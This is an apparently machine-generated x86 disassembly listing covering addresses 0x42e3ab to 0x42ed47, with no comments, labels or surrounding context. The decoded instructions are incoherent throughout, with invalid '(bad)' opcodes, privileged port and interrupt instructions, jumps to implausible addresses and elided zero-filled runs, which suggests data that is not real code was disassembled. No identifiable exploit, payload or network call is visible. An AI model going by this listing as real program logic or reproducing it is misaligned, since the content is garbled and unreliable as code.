  42e3ab:	les    esi,FWORD PTR [esi]
  42e3ad:	jmp    0x55bbbd91
  42e3b2:	leave  
  42e3b3:	dec    ecx
  42e3b4:	icebp  
  42e3b5:	cmp    dl,BYTE PTR [edi]
  42e3b7:	or     ebx,eax
  42e3b9:	push   ecx
  42e3ba:	push   edx
  42e3bb:	adc    DWORD PTR [ebp-0x12],edx
  42e3be:	or     BYTE PTR [ecx-0x1e],0x91
  42e3c2:	shl    DWORD PTR [edi-0x45f458ce],0x22
  42e3c9:	stos   DWORD PTR es:[edi],eax
  42e3ca:	mov    edi,DWORD PTR [edi]
  42e3cc:	clc    
  42e3cd:	pop    edx
  42e3ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e3cf:	dec    esp
  42e3d0:	iret   
  42e3d1:	ds aaa 
  42e3d3:	xor    eax,0x2774feb8
  42e3d8:	adc    al,0xa3
  42e3da:	mov    bl,0xa6
  42e3dc:	cmp    edx,0xa22a055e
  42e3e2:	jns    0x42e3b9
  42e3e4:	pop    edi
  42e3e5:	jno    0x42e444
  42e3e7:	retf   0xb019
  42e3ea:	jne    0x42e3dd
  42e3ec:	cdq    
  42e3ed:	push   0x171dad8c
  42e3f2:	dec    ebp
  42e3f3:	jl     0x42e3be
  42e3f5:	xor    bh,BYTE PTR ds:0x65f7dd78
  42e3fb:	push   ebp
  42e3fc:	jno    0x42e3bd
  42e3fe:	xchg   DWORD PTR ds:0xedb372f2,eax
  42e404:	pop    ss
  42e405:	arpl   WORD PTR [ebx+0x7f572d48],sp
  42e40b:	jmp    0x42e3d3
  42e40d:	dec    ebp
  42e40e:	aas    
  42e40f:	scas   al,BYTE PTR es:[edi]
  42e410:	jg     0x42e40d
  42e412:	pop    ebp
  42e413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e414:	(bad)  
  42e415:	test   eax,0xf1fd9a3b
  42e41a:	imul   ebp,DWORD PTR [edi],0x5d6e62f8
  42e420:	mov    dh,0x46
  42e422:	adc    eax,0x2643929b
  42e427:	mov    eax,ds:0x6e7e183d
  42e42c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e42d:	fdiv   DWORD PTR [eax-0x3a]
  42e430:	je     0x42e3d5
  42e432:	push   ecx
  42e433:	xchg   eax,ebp
  42e435:	dec    ebx
  42e436:	cdq    
  42e437:	(bad)  
  42e438:	out    0x3a,al
  42e43a:	add    ch,ah
  42e43c:	(bad)  
  42e43d:	push   esi
  42e43e:	xchg   esp,eax
  42e43f:	xchg   ecx,eax
  42e440:	loopne 0x42e4a5
  42e442:	push   ds
  42e443:	lds    esi,FWORD PTR [edx]
  42e445:	sti    
  42e446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e447:	sub    ebp,DWORD PTR [ebx-0x56db88df]
  42e44d:	jg     0x42e48f
  42e44f:	or     bl,BYTE PTR [edi-0x1d7844e4]
  42e455:	loop   0x42e476
  42e457:	jbe    0x42e3e6
  42e459:	and    eax,0xe8f57c49
  42e45e:	or     BYTE PTR [edx],cl
  42e460:	jo     0x42e446
  42e462:	cmp    bh,BYTE PTR [esi]
  42e464:	add    dh,BYTE PTR [eax-0x1]
  42e467:	jl     0x42e3ec
  42e469:	cs iret 
  42e46b:	or     edx,eax
  42e46d:	and    eax,0x0
	...
  42e4d6:	loop   0x42e495
  42e4d8:	fadd   st(7),st
  42e4da:	(bad)  
  42e4dc:	sti    
  42e4dd:	mov    ebp,0xe093f290
  42e4e2:	mov    edx,0x672f6453
  42e4e7:	lock add DWORD PTR [eax],eax
  42e4ea:	add    BYTE PTR [ecx],al
  42e4ec:	add    BYTE PTR [eax],al
  42e4ee:	imul   DWORD PTR [ebx+0x18]
  42e4f1:	and    eax,0x52ba4876
  42e4f6:	aam    0x3c
  42e4f8:	pop    es
  42e4f9:	sbb    DWORD PTR [ecx-0x7f81914c],0xfffffffe
  42e500:	repz jne 0x42e559
  42e503:	inc    eax
  42e504:	sub    ch,BYTE PTR [ebp-0x4e]
  42e507:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42e509:	retf   0x462a
  42e50c:	xor    eax,DWORD PTR [edi-0x7dd85827]
  42e512:	call   0x4fe0caf2
  42e517:	in     eax,0xdc
  42e519:	push   esp
  42e51a:	fisttp WORD PTR [ebx+0x4eb9030]
  42e520:	mov    al,ds:0xe9db97f1
  42e525:	das    
  42e526:	not    DWORD PTR [ebp-0x65253de1]
  42e52c:	sbb    eax,0x3c14dc81
  42e531:	retf   
  42e532:	inc    ebp
  42e533:	ds mov edx,0xdfa423c7
  42e539:	aam    0xd8
  42e53b:	or     BYTE PTR [edx-0x50d0b78],cl
  42e541:	fstp   QWORD PTR [ebp+0x52]
  42e544:	cmp    eax,0xe017b53f
  42e549:	sbb    eax,DWORD PTR [esi-0x4793f650]
  42e54f:	dec    eax
  42e550:	xchg   DWORD PTR [ebx-0x7afc5711],eax
  42e556:	jb     0x42e522
  42e558:	vpcmpgtd xmm2,xmm1,XMMWORD PTR [edx+esi*4-0x26]
  42e55e:	push   es
  42e55f:	popa   
  42e560:	pop    esi
  42e561:	push   ecx
  42e562:	ret    0x571d
  42e565:	add    BYTE PTR es:[ebp+0x5d06bceb],0x2
  42e56d:	addr16 mov edi,0xe6b40701
  42e573:	xlat   BYTE PTR ds:[ebx]
  42e574:	cmp    esi,esi
  42e576:	add    eax,0x8a44d2a1
  42e57b:	gs rcl BYTE PTR cs:0x884d9468,1
  42e583:	test   DWORD PTR [edi-0x1f],ebx
  42e586:	mov    WORD PTR [ebx-0x54],ss
  42e589:	inc    esp
  42e58a:	cdq    
  42e58b:	push   ss
  42e58c:	pop    ds
  42e58d:	pop    ss
  42e58e:	dec    BYTE PTR [esi-0x6f338c50]
  42e594:	adc    ebx,DWORD PTR [edx-0x46731d85]
  42e59a:	clc    
  42e59b:	add    BYTE PTR [esi+edi*4],bh
  42e59e:	jg     0x42e583
  42e5a0:	xchg   edi,eax
  42e5a1:	ret    0x1882
  42e5a4:	and    ah,BYTE PTR [ebx+0x600627f]
  42e5aa:	pop    edi
  42e5ab:	mov    esi,0x3063b7df
  42e5b0:	jl     0x42e5e2
  42e5b2:	mov    ebp,ebx
  42e5b4:	pop    esp
  42e5b5:	and    edi,ebx
  42e5b7:	shr    al,1
  42e5b9:	mov    edx,DWORD PTR [ecx-0x6a]
  42e5bc:	iret   
  42e5bd:	ss int 0xb
  42e5c0:	and    esi,DWORD PTR [edx]
  42e5c2:	dec    ecx
  42e5c3:	pop    ss
  42e5c4:	icebp  
  42e5c5:	mov    eax,0xc0757895
  42e5ca:	cmp    ebp,eax
  42e5cc:	mov    bl,bl
  42e5ce:	mov    esi,0x9b5408c3
  42e5d3:	inc    ebx
  42e5d4:	mov    esi,0x8b541bd
  42e5d9:	dec    ebp
  42e5da:	mov    al,ds:0x3df3d3d8
  42e5df:	inc    eax
  42e5e0:	retf   
  42e5e1:	sbb    DWORD PTR [eax-0x7846b64f],ebx
  42e5e7:	sub    eax,0xc4fe588d
  42e5ec:	xchg   BYTE PTR [ebx+0x0],dl
	...
  42e653:	add    BYTE PTR [eax],al
  42e655:	add    BYTE PTR [ebp+0x38],dl
  42e658:	into   
  42e659:	adc    bh,ch
  42e65b:	neg    bh
  42e65d:	jge    0x42e5f1
  42e65f:	xchg   ebp,eax
  42e660:	jns    0x42e693
  42e662:	jo     0x42e6b6
  42e664:	pop    ss
  42e665:	frstor [edi-0xf]
  42e668:	add    DWORD PTR [eax],eax
  42e66a:	add    BYTE PTR [ecx],al
  42e66c:	add    BYTE PTR [eax],al
  42e66e:	es xchg eax,ebx
  42e671:	jge    0x42e689
  42e673:	push   ebx
  42e674:	cmp    al,0xbc
  42e676:	cld    
  42e677:	outs   dx,BYTE PTR ds:[esi]
  42e678:	add    al,0x17
  42e67a:	outs   dx,DWORD PTR ds:[esi]
  42e67b:	dec    esp
  42e67c:	aam    0x8c
  42e67e:	shr    BYTE PTR [eax+0x8fffe0f],0x60
  42e685:	sbb    al,0x77
  42e687:	fwait
  42e688:	pop    edx
  42e689:	mov    ds:0xe78d512b,eax
  42e68e:	lea    ebx,[esi-0x69]
  42e691:	xor    BYTE PTR [esi-0x4],0xed
  42e695:	xor    eax,0x7c
  42e698:	inc    eax
  42e699:	sar    BYTE PTR [edx-0x1d3fbd89],1
  42e69f:	and    ecx,DWORD PTR [eax-0x21]
  42e6a2:	mov    ch,0xc8
  42e6a4:	and    BYTE PTR [ebx+0x30],al
  42e6a7:	popa   
  42e6a8:	aam    0x3c
  42e6aa:	sub    cl,BYTE PTR [edx+0xb26ec59]
  42e6b0:	sub    eax,DWORD PTR [edi+0x7]
  42e6b3:	test   BYTE PTR [esi],cl
  42e6b5:	inc    edx
  42e6b6:	push   0xecd6b13c
  42e6bb:	sub    DWORD PTR [esi+0x68],edi
  42e6be:	cmp    esp,DWORD PTR [edi+0x7cd8217d]
  42e6c4:	adc    DWORD PTR [ebp+0x63],edx
  42e6c7:	xchg   ebp,eax
  42e6c8:	ret    0x4b81
  42e6cb:	lahf   
  42e6cc:	jo     0x42e6ed
  42e6ce:	not    DWORD PTR [eax+0x72]
  42e6d1:	mov    dh,0x4a
  42e6d3:	adc    ecx,DWORD PTR [ebx-0x22]
  42e6d6:	iret   
  42e6d7:	cwde   
  42e6d8:	aad    0xc1
  42e6da:	cmp    eax,0x53a9eb03
  42e6df:	sub    BYTE PTR [ebx+0xa],al
  42e6e2:	xchg   DWORD PTR [edx+edx*4+0x13],esi
  42e6e6:	inc    edi
  42e6e7:	outs   dx,DWORD PTR ds:[esi]
  42e6e8:	neg    BYTE PTR [ecx-0x5a]
  42e6eb:	fcomp  DWORD PTR [ecx-0x7099df26]
  42e6f1:	in     al,dx
  42e6f2:	inc    ecx
  42e6f3:	shl    DWORD PTR [eax+edx*2+0x30],1
  42e6f7:	jns    0x42e73b
  42e6f9:	pop    ebp
  42e6fa:	addr16 xchg esp,eax
  42e6fc:	mov    cl,0x68
  42e6fe:	(bad)  
  42e6ff:	push   ecx
  42e700:	arpl   WORD PTR [eax+0xe],sp
  42e703:	and    DWORD PTR [ecx],ebx
  42e705:	not    BYTE PTR gs:[eax-0x758daad4]
  42e70c:	jno    0x42e72a
  42e70e:	mov    cl,0x57
  42e710:	lods   al,BYTE PTR ds:[esi]
  42e711:	pop    ss
  42e712:	mov    DWORD PTR [edi-0x19],ecx
  42e715:	or     DWORD PTR [esi+edx*2],edx
  42e718:	outs   dx,BYTE PTR ds:[esi]
  42e719:	and    eax,0x2801086e
  42e71e:	cmp    DWORD PTR [eax+0x1e4f3dec],esp
  42e724:	rep lods al,BYTE PTR ds:[esi]
  42e726:	aaa    
  42e727:	sbb    al,0x76
  42e729:	and    edx,edx
  42e72b:	sahf   
  42e72c:	in     al,dx
  42e72d:	scas   al,BYTE PTR es:[edi]
  42e72e:	nop
  42e72f:	enter  0x60c8,0x7
  42e733:	or     al,0xaa
  42e735:	dec    esp
  42e736:	js     0x42e788
  42e738:	adc    eax,0x51bdcc73
  42e73d:	cld    
  42e73e:	leave  
  42e73f:	jb     0x42e707
  42e741:	fbstp  TBYTE PTR [ebp-0xab4f001]
  42e747:	push   esp
  42e748:	dec    edx
  42e749:	ja     0x42e73b
  42e74b:	psrad  mm4,mm2
  42e74e:	and    eax,0x1dec941d
  42e753:	inc    eax
  42e754:	dec    esi
  42e755:	mov    ebx,0xddb9a223
  42e75a:	and    BYTE PTR [esp+eax*4],ch
  42e75d:	(bad)  
  42e75e:	jne    0x42e6fd
  42e760:	je     0x42e6e4
  42e762:	sub    eax,0x49282a90
  42e767:	push   es
  42e768:	xor    BYTE PTR [eax+0x7e],bh
  42e76b:	ins    DWORD PTR es:[edi],dx
  42e76c:	shl    esp,0x0
	...
  42e7d3:	add    BYTE PTR [eax],al
  42e7d5:	add    BYTE PTR [edx+0x39],bl
  42e7d8:	dec    esi
  42e7d9:	sub    eax,0x7f7b7f6f
  42e7de:	sub    BYTE PTR fs:[esi],cl
  42e7e1:	fidiv  DWORD PTR [edi+0x6737f9ab]
  42e7e7:	repnz add DWORD PTR [eax],eax
  42e7ea:	add    BYTE PTR [ecx],al
  42e7ec:	add    BYTE PTR [eax],al
  42e7ee:	mov    esi,0x2ef3bd12
  42e7f3:	pop    es
  42e7f4:	stos   DWORD PTR es:[edi],eax
  42e7f5:	push   cs
  42e7f6:	cmp    ecx,eax
  42e7f8:	mov    ds:0x56a3ce07,al
  42e7fd:	(bad)  
  42e7ff:	add    DWORD PTR [ebp-0x55d1e0d],eax
  42e805:	push   ecx
  42e806:	jle    0x42e83e
  42e808:	push   ds
  42e809:	adc    al,0xca
  42e80b:	iret   
  42e80c:	push   edx
  42e80d:	sbb    al,0x3a
  42e80f:	dec    edi
  42e810:	pop    ecx
  42e811:	test   BYTE PTR [ebx+0x53],cl
  42e814:	loop   0x42e869
  42e816:	retf   0x5b31
  42e819:	and    ecx,DWORD PTR [ebx+0x27]
  42e81c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e81d:	adc    edx,DWORD PTR [eax]
  42e81f:	mov    eax,0x577edddc
  42e824:	pop    es
  42e825:	mov    edi,?
  42e827:	ret    0x67a8
  42e82a:	fiadd  WORD PTR [eax+0x2900b265]
  42e830:	mov    ch,0xca
  42e832:	pop    es
  42e833:	scas   al,BYTE PTR es:[edi]
  42e834:	fbstp  TBYTE PTR [edi]
  42e836:	mov    ebx,0x45b7c8a
  42e83b:	cmp    al,0xf0
  42e83d:	cdq    
  42e83e:	adc    al,0xe5
  42e840:	repnz mov esp,0x798c38af
  42e846:	sbb    bl,BYTE PTR [edx-0x3a]
  42e849:	mov    ebx,0xd9e0d52d
  42e84e:	fldcw  WORD PTR [eax]
  42e850:	aas    
  42e851:	jns    0x42e7ed
  42e853:	neg    DWORD PTR [esi+edx*4+0x2d85a26d]
  42e85a:	test   eax,0x4a9dd395
  42e85f:	ficom  DWORD PTR [eax]
  42e861:	into   
  42e862:	mov    esp,ebp
  42e864:	cmc    
  42e865:	xchg   ebx,edi
  42e867:	pop    ss
  42e868:	jae    0x42e8d0
  42e86a:	lods   eax,DWORD PTR ds:[esi]
  42e86b:	jo     0x42e801
  42e86d:	lods   eax,DWORD PTR ds:[esi]
  42e86e:	add    esi,DWORD PTR [ebx-0x38]
  42e871:	xor    ah,BYTE PTR [eax+0x38]
  42e874:	fdivr  QWORD PTR [edx]
  42e876:	rol    BYTE PTR [ebx-0x24],0x30
  42e87a:	adc    ecx,esi
  42e87c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e87d:	(bad)  
  42e87f:	aas    
  42e880:	into   
  42e881:	cmp    DWORD PTR [ecx-0x49],esp
  42e884:	jno    0x42e844
  42e886:	dec    eax
  42e887:	imul   eax,DWORD PTR [edx],0xffffffec
  42e88a:	and    BYTE PTR [ebp+0x4f50ac1e],ch
  42e890:	addr16 pop ecx
  42e892:	test   eax,0xd1ef68e8
  42e897:	or     eax,0x884deb12
  42e89c:	icebp  
  42e89d:	out    0xb0,eax
  42e89f:	stos   BYTE PTR es:[edi],al
  42e8a0:	stos   BYTE PTR es:[edi],al
  42e8a1:	pop    ss
  42e8a2:	dec    edx
  42e8a3:	mov    bl,0xf4
  42e8a5:	ins    DWORD PTR es:[edi],dx
  42e8a6:	(bad)  
  42e8a8:	in     al,0xd8
  42e8aa:	cmp    al,0x94
  42e8ac:	sub    eax,0x185cfa22
  42e8b1:	and    eax,0x89490b80
  42e8b6:	xchg   ebx,eax
  42e8b7:	outs   dx,DWORD PTR ds:[esi]
  42e8b8:	test   BYTE PTR [edx+0x551b6440],0xcd
  42e8bf:	add    al,0x4c
  42e8c1:	dec    eax
  42e8c2:	adc    esi,DWORD PTR [edx-0x74d474c5]
  42e8c8:	daa    
  42e8c9:	outs   dx,DWORD PTR ds:[esi]
  42e8ca:	pop    ecx
  42e8cb:	sub    DWORD PTR [ecx],ecx
  42e8cd:	or     bh,al
  42e8cf:	nop
  42e8d0:	outs   dx,DWORD PTR ds:[esi]
  42e8d1:	fmul   DWORD PTR [ebx]
  42e8d3:	cwde   
  42e8d4:	add    eax,edi
  42e8d6:	repz iret 
  42e8d8:	cmp    dh,bh
  42e8da:	mov    ecx,0x6a8fa3d
  42e8df:	xor    eax,0x33f32ccd
  42e8e4:	outs   dx,BYTE PTR ds:[esi]
  42e8e5:	jp     0x42e8fe
  42e8e7:	loop   0x42e90a
  42e8e9:	ins    DWORD PTR es:[edi],dx
  42e8ea:	xchg   DWORD PTR [ebx+0xd4b8],edx
	...
  42e954:	add    BYTE PTR [eax],al
  42e956:	ret    
  42e957:	ja     0x42e9b9
  42e959:	and    al,0xf4
  42e95b:	aaa    
  42e95c:	(bad)  
  42e95d:	div    DWORD PTR [ecx-0x25dc07d5]
  42e963:	cwde   
  42e964:	jo     0x42e933
  42e966:	repz add DWORD PTR [bx+si],eax
  42e96a:	add    BYTE PTR [ecx],al
  42e96c:	add    BYTE PTR [eax],al
  42e96e:	mov    ?,WORD PTR [edi+eiz*2]
  42e971:	bound  edi,QWORD PTR [esi+0x15bb445a]
  42e977:	adc    al,0xeb
  42e979:	(bad)  
  42e97a:	rcr    BYTE PTR [eax+0x3c430ded],cl
  42e980:	dec    ecx
  42e981:	loope  0x42e904
  42e983:	sub    eax,0x43d801c2
  42e988:	mov    cl,0xe8
  42e98a:	pop    esi
  42e98b:	lods   al,BYTE PTR ds:[esi]
  42e98c:	and    BYTE PTR [ecx+esi*1+0x51],bl
  42e990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e991:	addr16 inc edi
  42e993:	jno    0x42e9ad
  42e995:	cwde   
  42e996:	inc    esi
  42e997:	mov    cl,0x51
  42e999:	xchg   BYTE PTR [ebp+0x11],bl
  42e99c:	ja     0x42e9dd
  42e99e:	and    BYTE PTR [ecx],0x37
  42e9a1:	sahf   
  42e9a2:	inc    edi
  42e9a3:	xlat   BYTE PTR ds:[ebx]
  42e9a4:	loope  0x42e93e
  42e9a6:	scas   eax,DWORD PTR es:[edi]
  42e9a7:	mov    ds,WORD PTR [eax-0x6a]
  42e9aa:	jns    0x42e94e
  42e9ac:	cmp    eax,esi
  42e9ae:	or     eax,0x2785053f
  42e9b3:	dec    edi
  42e9b4:	push   ds
  42e9b5:	xchg   DWORD PTR [ecx+edx*1],edx
  42e9b8:	mov    eax,ds:0x70e268c6
  42e9bd:	pop    ss
  42e9be:	jg     0x42e9ee
  42e9c0:	out    dx,eax
  42e9c1:	dec    ebx
  42e9c2:	pop    esi
  42e9c3:	sti    
  42e9c4:	cmp    BYTE PTR [edi-0x31ce9399],bl
  42e9ca:	aaa    
  42e9cb:	pop    esp
  42e9cc:	mov    edx,0x9c86727
  42e9d1:	adc    BYTE PTR [edi-0x3585fa97],0xf6
  42e9d8:	cmp    DWORD PTR [eax+0x78aaba07],edi
  42e9de:	(bad)  
  42e9df:	shr    DWORD PTR [edi-0x16d39fb2],1
  42e9e5:	rcl    ch,cl
  42e9e7:	fdivr  DWORD PTR [ebx+ebp*2]
  42e9ea:	dec    eax
  42e9eb:	jno    0x42ea0e
  42e9ed:	mov    bh,0x39
  42e9ef:	das    
  42e9f0:	mov    ds:0x94d73f6,eax
  42e9f5:	jb     0x42ea1b
  42e9f7:	in     eax,0xea
  42e9f9:	pop    ds
  42e9fa:	(bad)  
  42e9fb:	sbb    ebx,DWORD PTR [ebx]
  42e9fd:	inc    ecx
  42e9fe:	mov    bh,BYTE PTR [edx]
  42ea00:	ja     0x42ea01
  42ea02:	xchg   ecx,eax
  42ea03:	sbb    BYTE PTR [ecx-0x3fb31ae5],ch
  42ea09:	jmp    0x91e27ac3
  42ea0e:	fsub   QWORD PTR [eax+0x390ab056]
  42ea14:	pusha  
  42ea15:	xchg   edx,eax
  42ea16:	sub    al,0x45
  42ea18:	push   ds
  42ea19:	fistp  QWORD PTR [edi]
  42ea1b:	push   ebp
  42ea1c:	sbb    eax,0x1558b205
  42ea21:	mov    edx,0xa2071379
  42ea26:	mov    ecx,0x7d830cd6
  42ea2b:	(bad)  
  42ea2c:	push   ebx
  42ea2d:	mov    BYTE PTR [esi],ch
  42ea2f:	les    ebx,FWORD PTR [ecx-0x3]
  42ea32:	pop    ss
  42ea33:	arpl   WORD PTR [edx-0x32],bx
  42ea36:	outs   dx,DWORD PTR ds:[esi]
  42ea37:	aas    
  42ea38:	mov    WORD PTR [ecx-0x70],cs
  42ea3b:	push   ss
  42ea3c:	ins    BYTE PTR es:[edi],dx
  42ea3d:	and    ebp,0x3f
  42ea40:	icebp  
  42ea41:	inc    ebp
  42ea42:	and    DWORD PTR [edi],eax
  42ea44:	adc    ch,BYTE PTR [ebp+0x33]
  42ea47:	push   esi
  42ea48:	pop    edx
  42ea49:	jge    0x42eaa2
  42ea4b:	rcl    BYTE PTR [edx-0x40],1
  42ea4e:	test   BYTE PTR [edi+0x7398cf4e],ch
  42ea54:	imul   edi,DWORD PTR [edx],0x211b7d86
  42ea5a:	push   ds
  42ea5b:	mov    dh,0x2f
  42ea5d:	mov    edx,0xe71ca82a
  42ea62:	push   ebx
  42ea63:	imul   ecx,edi,0xe3e567e4
  42ea69:	and    BYTE PTR [ebp-0x1c],ch
  42ea6c:	push   cs
  42ea6d:	imul   eax,DWORD PTR [eax],0x0
	...
  42ead4:	add    BYTE PTR [eax],al
  42ead6:	in     eax,0xba
  42ead8:	xchg   edx,eax
  42ead9:	jecxz  0x42eaba
  42eadb:	jmp    0x42ead2
  42eadd:	mov    esi,0x66dc160c
  42eae2:	iret   
  42eae3:	inc    eax
  42eae4:	cdq    
  42eae5:	xor    ah,BYTE PTR [edi-0xc]
  42eae8:	add    DWORD PTR [eax],eax
  42eaea:	add    BYTE PTR [ecx],al
  42eaec:	add    BYTE PTR [eax],al
  42eaee:	dec    esp
  42eaef:	arpl   WORD PTR [edx],cx
  42eaf1:	sbb    bh,ch
  42eaf3:	fisttp DWORD PTR [edi-0x7c75d0c9]
  42eaf9:	fnsave [ebp-0x70]
  42eafc:	jl     0x42ea98
  42eafe:	pop    eax
  42eaff:	add    DWORD PTR [edi+eiz*8],ebp
  42eb02:	xchg   ecx,eax
  42eb03:	ins    BYTE PTR es:[edi],dx
  42eb04:	fst    QWORD PTR [eax-0x6c]
  42eb07:	test   al,0xde
  42eb09:	daa    
  42eb0a:	enter  0xc818,0x6f
  42eb0e:	mov    ds:0x10532e7a,al
  42eb13:	outs   dx,DWORD PTR ds:[esi]
  42eb14:	mov    ds:0xad4bb771,eax
  42eb19:	int    0x0
  42eb1b:	inc    ecx
  42eb1c:	inc    ecx
  42eb1d:	int    0x86
  42eb1f:	dec    ecx
  42eb20:	xchg   edi,eax
  42eb21:	out    0xc5,eax
  42eb23:	sar    BYTE PTR [edx],0xb8
  42eb26:	mov    ebx,0xe8c4a439
  42eb2b:	push   DWORD PTR [esi]
  42eb2d:	cmp    DWORD PTR [ebp+0x5953fa2d],esp
  42eb33:	sahf   
  42eb34:	fistp  WORD PTR [eax]
  42eb36:	push   0xea8ba399
  42eb3b:	dec    ebp
  42eb3c:	dec    ebp
  42eb3d:	shl    DWORD PTR [edx-0x51],cl
  42eb40:	mov    ch,0x7a
  42eb42:	add    ebp,DWORD PTR [ebp-0x10da3a41]
  42eb48:	enter  0xfe70,0x6e
  42eb4c:	or     eax,DWORD PTR [edi]
  42eb4e:	stos   BYTE PTR es:[edi],al
  42eb4f:	or     eax,DWORD PTR cs:[edx-0x3a]
  42eb53:	xchg   edx,eax
  42eb54:	test   al,0xbf
  42eb56:	jae    0x42ebd5
  42eb58:	pop    ebp
  42eb59:	push   eax
  42eb5a:	jns    0x42eb8d
  42eb5c:	adc    ebp,DWORD PTR [ebp+0x598fc9aa]
  42eb62:	xlat   BYTE PTR ds:[ebx]
  42eb63:	sub    al,0x1a
  42eb65:	ret    
  42eb66:	sbb    bh,BYTE PTR [esi]
  42eb68:	loopne 0x42eaf9
  42eb6a:	mov    esp,0xcd2fe5a5
  42eb6f:	ds in  al,0x16
  42eb72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb73:	mov    bh,0x5a
  42eb75:	push   ebp
  42eb76:	dec    edx
  42eb77:	adc    DWORD PTR [edx-0x74dc1c10],ecx
  42eb7d:	outs   dx,BYTE PTR ds:[esi]
  42eb7e:	xor    al,0xdd
  42eb80:	mov    edx,0x5c241dbb
  42eb85:	jle    0x42ebac
  42eb87:	mov    cs,WORD PTR [esi-0x43]
  42eb8a:	aaa    
  42eb8b:	test   DWORD PTR [edi+0x1d7cd0d],ebp
  42eb91:	pop    esi
  42eb92:	cmp    DWORD PTR [esp+esi*4+0x1b1d9465],esp
  42eb99:	pop    ebp
  42eb9a:	cdq    
  42eb9b:	rcl    BYTE PTR [ebp+esi*2-0x26],0xda
  42eba0:	arpl   WORD PTR [eax+esi*2+0x18],si
  42eba4:	and    ebx,ecx
  42eba6:	xchg   ecx,eax
  42eba7:	out    dx,eax
  42eba8:	sti    
  42eba9:	outs   dx,DWORD PTR ds:[esi]
  42ebaa:	and    BYTE PTR [ebp+0x2f],0x3d
  42ebae:	jbe    0x42ec14
  42ebb0:	push   0xe
  42ebb2:	and    eax,DWORD PTR [eax-0x78]
  42ebb5:	cld    
  42ebb6:	aad    0x22
  42ebb8:	xchg   edi,eax
  42ebb9:	jle    0x42eb9e
  42ebbb:	dec    edi
  42ebbc:	mov    al,ds:0x4010ce9a
  42ebc1:	fwait
  42ebc2:	mov    eax,ds:0x3d78e0eb
  42ebc7:	mov    DWORD PTR [ebx+0x68],edi
  42ebca:	call   0x4a9:0x837eaa32
  42ebd1:	jmp    0x79ff7026
  42ebd6:	xor    BYTE PTR [edi+0x6],bl
  42ebd9:	ror    DWORD PTR [edi-0x47],1
  42ebdc:	sub    dh,BYTE PTR [edx-0x33696d97]
  42ebe2:	sub    al,0x86
  42ebe4:	sbb    DWORD PTR [ebx-0x5c],edx
  42ebe7:	rcr    BYTE PTR [ebx+0x59da2a7c],0xd6
	...
  42ec56:	jle    0x42ec99
  42ec58:	jne    0xfc41bb9d
  42ec5e:	pusha  
  42ec5f:	popf   
  42ec60:	pop    ecx
  42ec61:	cmp    esi,0x674f2814
  42ec67:	cmc    
  42ec68:	add    DWORD PTR [eax],eax
  42ec6a:	add    BYTE PTR [ecx],al
  42ec6c:	add    BYTE PTR [eax],al
  42ec6e:	fnstenv [esi-0x61b0d430]
  42ec74:	ds xchg edi,eax
  42ec76:	inc    eax
  42ec77:	rcl    eax,0x70
  42ec7a:	ja     0x42ec3f
  42ec7c:	in     al,dx
  42ec7d:	fsubp  st(4),st
  42ec7f:	cmp    ecx,DWORD PTR [ebp+0x12d68e9a]
  42ec85:	pop    edi
  42ec86:	loop   0x42ec1c
  42ec88:	dec    esp
  42ec89:	jg     0x42ec37
  42ec8b:	call   0xc1435b94
  42ec90:	ror    BYTE PTR [edx+0x73],cl
  42ec93:	xchg   DWORD PTR [eax],edx
  42ec95:	adc    DWORD PTR [ecx+0x4a],0x4a
  42ec99:	mov    DWORD PTR [edx+0x77],ebx
  42ec9c:	add    BYTE PTR [edx-0x76],cl
  42ec9f:	pop    esi
  42eca0:	push   edx
  42eca1:	out    0xf1,eax
  42eca3:	ins    DWORD PTR es:[edi],dx
  42eca4:	or     ecx,ebx
  42eca6:	(bad)  
  42eca7:	aas    
  42eca8:	repz adc DWORD PTR [esp+eiz*2],edx
  42ecac:	retf   
  42ecad:	(bad)  
  42ecae:	push   ss
  42ecaf:	mov    ebx,DWORD PTR [edx+0x13]
  42ecb2:	bound  esi,QWORD PTR [ebp-0x9]
  42ecb5:	das    
  42ecb6:	sbb    DWORD PTR [ecx-0x2e],0x79d45da
  42ecbd:	(bad)  
  42ecbf:	jle    0x42ecbb
  42ecc1:	mov    dl,0x56
  42ecc3:	inc    eax
  42ecc4:	sub    DWORD PTR [ecx+0x29a2a49b],0xb0b470
  42ecce:	imul   esi,eax,0x53
  42ecd1:	inc    ebp
  42ecd2:	sub    DWORD PTR [ebp+0x5e],ebp
  42ecd5:	dec    esi
  42ecd6:	sub    esp,DWORD PTR [edi]
  42ecd8:	xchg   ebp,eax
  42ecd9:	mov    ?,WORD PTR [ebx]
  42ecdb:	lahf   
  42ecdc:	pop    ss
  42ecdd:	out    dx,al
  42ecde:	xor    al,bh
  42ece0:	popf   
  42ece1:	fidivr WORD PTR [eax-0x56801fee]
  42ece7:	and    DWORD PTR ds:0xcb5b04ed,eax
  42eced:	add    eax,0x5422fae5
  42ecf2:	dec    edi
  42ecf3:	test   eax,0x9c55eef
  42ecf8:	inc    eax
  42ecf9:	hlt    
  42ecfa:	adc    eax,0xd7b172d0
  42ecff:	mov    cl,0xf9
  42ed01:	in     eax,0xa7
  42ed03:	outs   dx,BYTE PTR ds:[esi]
  42ed04:	sti    
  42ed05:	sub    DWORD PTR [esp+esi*8-0x56fcc10e],ebx
  42ed0c:	jnp    0x42ed70
  42ed0e:	in     al,dx
  42ed0f:	imul   BYTE PTR [edi+0x3190d6d8]
  42ed15:	hlt    
  42ed16:	xor    eax,0x73a8d334
  42ed1b:	pop    edx
  42ed1c:	jmp    0x69867ba5
  42ed21:	xchg   DWORD PTR [edi-0x25],ebx
  42ed24:	dec    edi
  42ed25:	mov    fs,WORD PTR [ebp+0x72802c73]
  42ed2b:	jns    0x42ed32
  42ed2d:	std    
  42ed2e:	sbb    DWORD PTR [ebx-0x52d98cbe],0x38af2ff8
  42ed38:	fcom   QWORD PTR [eax+0x731145e1]
  42ed3e:	push   edi
  42ed3f:	cld    
  42ed40:	dec    eax
  42ed41:	inc    eax
  42ed42:	les    ebx,FWORD PTR [bx+si]
  42ed45:	out    0xb5,al
  42ed47:	lahf   
